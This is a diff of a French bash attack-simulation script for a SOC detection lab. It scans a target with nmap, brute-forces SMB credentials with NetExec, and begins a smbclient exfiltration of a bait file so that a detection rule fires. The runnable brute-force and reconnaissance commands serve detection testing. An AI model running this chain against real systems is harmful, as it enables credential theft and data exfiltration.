@@ -1,11 +1,11 @@
 #!/usr/bin/env bash
 #
-# smb_exfil.sh — Scénario S2 : Exfiltration de données financières via SMB
+# smb_exfil.sh - Scénario S2 : Exfiltration de données financières via SMB
 # (NyxSOC)
 #
 # Chaîne d'attaque en 3 étapes, conforme à Topologie.pdf §6.2 :
 #   1. Reconnaissance réseau (nmap)       -> filterlog (OPNsense) : net_scan
-#   2. Brute-force SMB (CrackMapExec)     -> daemon/Samba : smb_failure
+#   2. Brute-force SMB (NetExec / nxc)    -> daemon/Samba : smb_failure
 #   3. Exfiltration (smbclient)           -> daemon/Samba : samba_read
 #
 # Règle attendue : SMB_EXFIL_001 (Type 3, cooccurrence net_scan + samba_read
@@ -14,7 +14,7 @@
 # Prérequis :
 #   - users.txt / passwords.txt générés via gen_smb_wordlists.py
 #   - releves_mm.csv déjà déposé dans //target/direction (deploy_bait_file.sh)
-#   - nmap, crackmapexec, smbclient installés (par défaut sur Kali)
+#   - nmap, netexec (nxc), smbclient installés (par défaut sur Kali récent)
 #
 # Usage :
 #   ./smb_exfil.sh <target_ip> <target_share> <remote_file>
@@ -66,7 +66,7 @@ if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
     exit 1
 fi
 
-# --- Étape 1 : reconnaissance réseau ------------------------------------
+# Étape 1 : reconnaissance réseau
 echo ""
 echo "[1/3] Scan nmap (reconnaissance réseau)..."
 TS_STEP1_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
@@ -74,29 +74,29 @@ nmap -sV "${TARGET}/32" -oN "$NMAP_LOG" || true
 TS_STEP1_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
 echo "[+] Scan terminé. Résultat : ${NMAP_LOG}"
 
-# --- Étape 2 : brute-force SMB ------------------------------------------
+# Étape 2 : brute-force SMB 
 echo ""
-echo "[2/3] Brute-force SMB (CrackMapExec)..."
+echo "[2/3] Brute-force SMB (NetExec)..."
 TS_STEP2_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
-crackmapexec smb "$TARGET" -u "$USERS_FILE" -p "$PASSWORDS_FILE" 2>&1 | tee "$CME_LOG" || true
+nxc smb "$TARGET" -u "$USERS_FILE" -p "$PASSWORDS_FILE" 2>&1 | tee "$CME_LOG" || true
 TS_STEP2_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
 
-# Extraction du premier compte/mot de passe valide trouvé (marqué [+] par CME)
+# Extraction du premier compte/mot de passe valide trouvé (marqué [+] par nxc)
 VALID_LINE=$(grep -m1 '\[+\]' "$CME_LOG" || true)
 if [ -z "$VALID_LINE" ]; then
-    echo "[!] Aucune paire valide trouvée par CrackMapExec. Arrêt avant exfiltration."
+    echo "[!] Aucune paire valide trouvée par NetExec. Arrêt avant exfiltration."
     echo "    Vérifie users.txt / passwords.txt et le mot de passe réel injecté."
     exit 1
 fi
 echo "[+] Paire valide trouvée : ${VALID_LINE}"
 
-# Format typique CME : "SMB  10.0.1.20  445  SRV-PME  [+] NYX\dir1:MotDePasse"
+# Format typique nxc : "SMB  10.0.1.20  445  SRV-PME  [+] NYX\dir1:MotDePasse"
 VALID_USER=$(echo "$VALID_LINE" | grep -oP '(?<=\\\\)[^:]+(?=:)' || echo "unknown")
 VALID_PASS=$(echo "$VALID_LINE" | grep -oP '(?<=:)[^\s]+$' || echo "unknown")
 
 echo "    Compte compromis : ${VALID_USER}"
 
-# --- Étape 3 : exfiltration ----------------------------------------------
+# Étape 3 : exfiltration
 echo ""
 echo "[3/3] Exfiltration via smbclient..."
 TS_STEP3_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
